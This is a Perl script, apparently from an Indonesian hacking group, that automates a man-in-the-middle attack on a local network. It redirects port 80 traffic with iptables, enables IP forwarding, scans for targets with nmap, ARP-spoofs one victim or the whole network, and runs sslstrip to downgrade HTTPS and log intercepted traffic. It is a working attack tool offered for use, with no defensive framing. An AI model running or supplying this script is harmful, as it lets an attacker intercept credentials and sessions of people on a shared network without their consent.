#! /usr/bin/perl -w 

#########################################################################
# Script Created By:
# Dabojo
# MAMAN
# Man In The Middle Attack network
# IPtables + Arpspoof + SSLStrip
#
# http://tasikcyber.or.id
#########################################################################

use strict;
use warnings;

# open /etc/etter.conf and uncomment
# iptables redirect on/off
# ctrl+o to save changes
# ctrl+x to exit nano and continue with script

my $tables;
print "########################################\n";
print "You will have to uncomment iptables redirect.\n";
print "Inside nano use ctrl+o to save your changes & ctrl+x to exit and continue the script.\n";
print "Would you like to open /etc/etter.conf to uncomment iptables redirect? (y/n)\n";
$tables=<STDIN>;
chomp($tables);
    if ($tables eq "y"){
        print "press ctrl+x to exit nano";
        system ("sudo nano /etc/etter.conf");
    }

# change iptables to allow redirection from port 80 to port 8080
my $redirect;
print "########################################\n";
print "Changing iptables to redirect traffic from port 80 to port 8080\n";
$redirect=`sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080`;

# check to make sure ip forwarding is enabled
my $forward;
print "########################################\n";
print "Checking to make sure ip forwarding is enabled\n";
system ("cat /proc/sys/net/ipv4/ip_forward");
print "Does ip forward = 0? (y/n)\n";
$forward=<STDIN>;
chomp($forward);
    if ($forward eq "y"){
        system ("sudo nano /proc/sys/net/ipv4/ip_forward");
        system ("cat /proc/sys/net/ipv4/ip_forward");
}

# check to find out what the default gateway is
my $default;
print "########################################\n";
system ("netstat -nr");
    print "What is the default gateway?\n";
    $default=<STDIN>;
    chomp($default);

# check which network interface device
my $interface;
print "########################################\n";
system ("ifconfig");
    print "Which network interface would you like to use?\n";
    $interface=<STDIN>;
    chomp($interface);

# check what your ip address is
my $ip;
print "########################################\n";
system ("ifconfig $interface");
    print "What is your IP address?\n";
    $ip=<STDIN>;
    chomp($ip);

# option to run nmap scan for a target
my $nmap;
my $netip;
print "########################################\n";
print "Would you like to run an nmap scan of the network to find a target? (y/n)\n";
    $nmap=<STDIN>;
    chomp($nmap);
    if ($nmap eq "y"){
        print "Enter the IP to scan then entire network (ex: 192.168.1.*)\n";
            $netip=<STDIN>;
            chomp($netip);
            system ("nmap -v -PN $netip");
}

# start arpspoof; option to spoof a target or spoof the entire network
my $arp;
my $target;
print "########################################\n";
print "Do you want to spoof a specific target? (y/n)\n";
    $arp=<STDIN>;
    chomp($arp);
        if ($arp eq "y"){
            print "Enter the IP of the Target: \n";
            $target=<STDIN>;
            chomp($target);
                system ("xterm -e sudo arpspoof -i $interface -t $target $default &");
        }
        else {
            system ("xterm -e sudo arpspoof -i $interface $default &");
        } 

# start ssl strip
my $ssl;
my $log;
print "########################################\n";
print "Starting SSL Strip.\n";
print "We have a few options for our parameters with SSL Strip.\n";
print "Here are you options: \nsniff all traffic, kill active sessions, log data (akl) \nkill, log, and sniff only https traffic (kl) \nlog https traffic only(l)\n";
    $ssl=<STDIN>;
    chomp($ssl);
print "Enter name of the log file, it has to end with '.log'? (ex: strip.log )\n";
    $log=<STDIN>;
    chomp($log);
        if ($ssl eq "akl"){
            system ("xterm -e sudo sslstrip -a -k -l 8080 -w $log &");
        }
        if ($ssl eq "kl"){
            system ("xterm -e sudo sslstrip -k -l 8080 -w $log &");
        }
        elsif ($ssl eq "l"){
            system ("xterm -e sudo sslstrip -l 8080 -w $log &");
        }

# start following the sslstrip log using tail
my $tail;
print "########################################\n";
print "Do you want to start to follow the log file in real time? (y/n)\n";
    $tail=<STDIN>;
    chomp($tail);    
    if ($tail eq "y"){
        print "Starting to tail the sslstrip log file.\n";
        system ("xterm -e sudo tail -f $log &");
    }
    else {
        print "Script done. Time to wait.\n";
    }
